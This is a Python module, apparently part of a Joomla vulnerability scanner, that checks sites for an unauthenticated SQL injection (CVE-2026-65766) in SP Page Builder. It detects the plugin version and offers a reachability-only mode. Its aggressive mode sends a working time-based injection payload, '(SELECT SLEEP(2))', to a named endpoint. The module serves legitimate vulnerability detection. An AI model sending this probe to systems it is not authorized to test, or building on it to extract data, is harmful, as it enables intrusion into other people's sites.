from __future__ import annotations

import json
import re
import time
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-65766"
NAME = "SP Page Builder unauthenticated Dynamic Content order SQL injection"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.7.0; fixed in 6.7.1"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
ENDPOINT = "/index.php?option=com_sppagebuilder&task=dynamic_content.loadMoreCollectionData&format=json"
SLEEP_THRESHOLD = 1.2


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.7.1")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}, within the affected range below 6.7.1."
        action = "Upgrade SP Page Builder to 6.7.1 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which validates the Dynamic Content order direction."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.7.1 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _timed_post(client: HttpClient, url: str, payload: dict[str, Any], timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.request(
        url,
        method="POST",
        headers={"Content-Type": "application/json"},
        data=json.dumps(payload).encode(),
        timeout=timeout,
    )
    return response, time.perf_counter() - start


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Send benign and SLEEP payloads to the Dynamic Content load-more route.

    6.7.0 and earlier pass the JSON ``direction`` value straight into
    ``->order('title ' . $direction)`` in ``loadMoreCollectionData``. 6.7.1
    restricts the direction to an allowlist. The probe compares request
    timing; a controller that is not dispatchable returns a redirect/error
    and is reported as blocked rather than vulnerable.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    url = f"{base}{ENDPOINT}"
    benign_payload = {
        "collection_id": -3,
        "direction": "ASC",
        "limit": 20,
        "page": 1,
        "addon": "{}",
        "filters": None,
        "currentLink": "",
    }
    probe_payload = dict(benign_payload)
    probe_payload["direction"] = "ASC, (SELECT SLEEP(2))"
    benign, benign_time = _timed_post(client, url, benign_payload, timeout)
    if is_transport_error(benign):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The benign Dynamic Content request failed in transit ({transport_error_detail(benign)}).", action="Retry when the target is reachable.")
    probe, probe_time = _timed_post(client, url, probe_payload, timeout)
    if is_transport_error(probe):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Dynamic Content probe failed in transit ({transport_error_detail(probe)}).", action="Retry when the target is reachable.")
    delta = probe_time - benign_time
    evidence = {
        "benign_status": benign.get("status"),
        "benign_seconds": round(benign_time, 3),
        "probe_status": probe.get("status"),
        "probe_seconds": round(probe_time, 3),
        "delta_seconds": round(delta, 3),
        "sleep_threshold": SLEEP_THRESHOLD,
    }
    if benign.get("status") == 200 and probe.get("status") == 200 and delta >= SLEEP_THRESHOLD:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail=f"The unauthenticated Dynamic Content direction value reached the ORDER BY clause and added {delta:.2f}s over the benign request.", action="Upgrade SP Page Builder to 6.7.1 or newer.")
    if benign.get("status") in (301, 302, 303, 307, 308, 403, 404, 500) or probe.get("status") in (301, 302, 303, 307, 308, 403, 404, 500):
        detail = "The Dynamic Content load-more route is not dispatchable on the retained fixture (the 6.0.0 site controller is rejected and the 6.10.0 release is patched)."
        status = "BLOCKED_EXTERNAL"
    else:
        detail = f"The Dynamic Content endpoint returned HTTP {probe.get('status')} without the SLEEP delay."
        status = "NOT_CONFIRMED"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail=detail, action="Upgrade affected SP Page Builder versions even when the external proof is inconclusive.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_sppagebuilder"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The component page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The component is reachable; the Dynamic Content order payload was not sent in safe mode.", action="Use aggressive mode on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (Dynamic Content order timing) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-16", "updated": "2026-11-16", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-65766", "https://www.joomshaper.com", "https://mysites.guru/vulnerabilities/CVE-2026-65766"]}
